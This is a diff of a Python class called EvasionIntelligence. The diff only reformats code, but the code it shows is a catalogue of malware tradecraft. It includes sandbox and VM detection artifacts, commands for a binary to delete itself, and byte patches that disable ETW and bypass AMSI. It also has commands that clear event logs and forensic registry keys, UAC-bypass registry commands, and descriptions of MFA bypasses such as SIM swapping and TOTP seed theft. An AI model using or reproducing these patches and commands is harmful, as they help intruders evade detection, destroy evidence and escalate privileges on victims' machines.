@@ -27,41 +27,45 @@ class EvasionIntelligence:
                     r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
                     r"HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                     # Identifier: VMWARE
-                    r"HKLM\SYSTEM\ControlSet001\Control\SystemInformation"  # SystemManufacturer: VMWARE
+                    r"HKLM\SYSTEM\ControlSet001\Control\SystemInformation",  # SystemManufacturer: VMWARE
                 ],
                 "vbox": [
                     r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
                     r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
-                    r"HKLM\HARDWARE\Description\System\VideoBiosVersion"  # VIRTUALBOX
+                    r"HKLM\HARDWARE\Description\System\VideoBiosVersion",  # VIRTUALBOX
                 ],
                 "qemu": [
                     r"HKLM\HARDWARE\Description\System\SystemBiosVersion"  # QEMU
                 ],
-                "wine": [
-                    r"HKLM\SOFTWARE\Wine"
-                ]
+                "wine": [r"HKLM\SOFTWARE\Wine"],
             },
             "files": [
                 r"C:\Windows\system32\drivers\VBoxMouse.sys",
                 r"C:\Windows\system32\drivers\VBoxGuest.sys",
                 r"C:\Windows\system32\drivers\vmhgfs.sys",
                 r"C:\Windows\system32\drivers\vmmouse.sys",
-                r"C:\Windows\system32\drivers\vmmemctl.sys"
+                r"C:\Windows\system32\drivers\vmmemctl.sys",
             ],
             "processes": [
-                "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
-                "prl_cc.exe", "xenservice.exe", "qemu-ga.exe", "joeboxserver.exe"
+                "vboxservice.exe",
+                "vboxtray.exe",
+                "vmtoolsd.exe",
+                "vmwaretray.exe",
+                "prl_cc.exe",
+                "xenservice.exe",
+                "qemu-ga.exe",
+                "joeboxserver.exe",
             ],
             "mac_prefixes": [
                 "08:00:27",  # VBox
-                "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",  # VMware
+                "00:05:69",
+                "00:0C:29",
+                "00:1C:14",
+                "00:50:56",  # VMware
                 "00:1C:42",  # Parallels
-                "00:16:3E"   # Xen
+                "00:16:3E",  # Xen
             ],
-            "cpu_instructions": [
-                "CPUID(0x40000000) Hypervisor Brand",
-                "CPUID(0x1) ECZ bit 31 (Hypervisor Present)"
-            ]
+            "cpu_instructions": ["CPUID(0x40000000) Hypervisor Brand", "CPUID(0x1) ECZ bit 31 (Hypervisor Present)"],
         }
 
     @staticmethod
@@ -69,13 +73,12 @@ class EvasionIntelligence:
         """Multi-method approaches for executable self-deletion (Melt)."""
         return {
             "delay_reboot": "MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)",
-            "batch_melt": "@echo off\ntimeout /t 3\ndel \"%s\"\ndel \"%%~f0\"",
-            "cmd_timeout": "cmd.exe /C timeout /t 2 && del \"%s\"",
+            "batch_melt": '@echo off\ntimeout /t 3\ndel "%s"\ndel "%%~f0"',
+            "cmd_timeout": 'cmd.exe /C timeout /t 2 && del "%s"',
             "modern_melt": "SetFileInformationByHandle(handle, FileRenameInfo, FILE_FLAG_DELETE_ON_CLOSE)",
             "schtasks": (
-                "schtasks /create /tn Melt /tr \"cmd /c del %s\" "
-                "/sc once /st 00:00 /f && schtasks /run /tn Melt"
-            )
+                'schtasks /create /tn Melt /tr "cmd /c del %s" /sc once /st 00:00 /f && schtasks /run /tn Melt'
+            ),
         }
 
     @staticmethod
@@ -85,13 +88,13 @@ class EvasionIntelligence:
             "nttraceevent_patch": {
                 "dll": "ntdll.dll",
                 "function": "NtTraceEvent",
-                "patch": [0xC2, 0x14, 0x00]  # ret 0x14
+                "patch": [0xC2, 0x14, 0x00],  # ret 0x14
             },
             "etw_event_write": {
                 "dll": "ntdll.dll",
                 "function": "EtwEventWrite",
-                "patch": [0xC3]  # ret
-            }
+                "patch": [0xC3],  # ret
+            },
         }
 
     @staticmethod
@@ -101,14 +104,14 @@ class EvasionIntelligence:
             "amsi_scan_buffer_patch": {
                 "dll": "amsi.dll",
                 "function": "AmsiScanBuffer",
-                "patch": [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]  # mov eax, 0x80070057; ret
+                "patch": [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3],  # mov eax, 0x80070057; ret
             },
             "amsi_scan_buffer_patch_v2": {
                 "dll": "amsi.dll",
                 "function": "AmsiScanBuffer",
-                "patch": [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]  # mov eax, 0; ret (EvilByte version)
+                "patch": [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3],  # mov eax, 0; ret (EvilByte version)
             },
-            "amsi_context_null": "Patching AmsiContext to NULL in memory"
+            "amsi_context_null": "Patching AmsiContext to NULL in memory",
         }
 
     @staticmethod
@@ -123,12 +126,10 @@ class EvasionIntelligence:
             ),
             "event_log_clear": "wevtutil cl {log_name}",
             "gutmann_shred": (
-                "35-pass overwrite with specific patterns (0x55, 0xAA, 0x92, etc.) "
-                "to defeat magnetic force microscopy"
+                "35-pass overwrite with specific patterns (0x55, 0xAA, 0x92, etc.) to defeat magnetic force microscopy"
             ),
             "file_melt_nt": (
-                "Deleting the currently executing binary from disk via NTFS stream tricks "
-                "or pending move rename"
+                "Deleting the currently executing binary from disk via NTFS stream tricks or pending move rename"
             ),
             "clear_shellbags": (
                 r"reg delete \"HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows"
@@ -137,7 +138,7 @@ class EvasionIntelligence:
             "clear_shimcache": (
                 r"reg delete \"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"
                 r"\AppCompatCache\" /v AppCompatCache /f"
-            )
+            ),
         }
 
     @staticmethod
@@ -149,7 +150,7 @@ class EvasionIntelligence:
                 "Delegating Cloudflare Turnstile/HCaptcha solving to an automated browser instance"
             ),
             "user_agent_consistency": "Ensuring TLS handshake fingerprint matches the User-Agent string",
-            "proxy_rotation_geo": "Rotating IPs from the same geographic region to avoid session pinning alerts"
+            "proxy_rotation_geo": "Rotating IPs from the same geographic region to avoid session pinning alerts",
         }
 
     @staticmethod
@@ -162,9 +163,7 @@ class EvasionIntelligence:
             "active_directory_attribute": (
                 "Executing shellcode staged in user/computer attributes (e.g., thumbnailPhoto)"
             ),
-            "file_tunneling_relay": (
-                "Synchronizing remote streams via shared file locks/write-offsets (File-Tunnel)"
-            )
+            "file_tunneling_relay": ("Synchronizing remote streams via shared file locks/write-offsets (File-Tunnel)"),
         }
 
     @staticmethod
@@ -175,7 +174,7 @@ class EvasionIntelligence:
             "computerdefaults": r"reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d \"%s\" /f",
             "sdclt": r"reg add HKCU\Software\Classes\exefile\shell\runas\command /d \"%s\" /f",
             "cmstp": "Using .inf file with AdvancedInstall and CMSTP.exe",
-            "ishelldispatch2": "Using Shell.Application COM object to run unelevated from elevated context"
+            "ishelldispatch2": "Using Shell.Application COM object to run unelevated from elevated context",
         }
 
     @staticmethod
@@ -190,5 +189,5 @@ class EvasionIntelligence:
             ),
             "sim_swapping": "Redirecting SMS-based 2FA codes by hijacking the victim's phone number",
             "totp_seed_theft": "Exfiltrating the TOTP shared secret from the device or server-side database",
-            "session_token_theft": "Stealing active browser sessions via info-stealing malware or XSS"
+            "session_token_theft": "Stealing active browser sessions via info-stealing malware or XSS",
         }
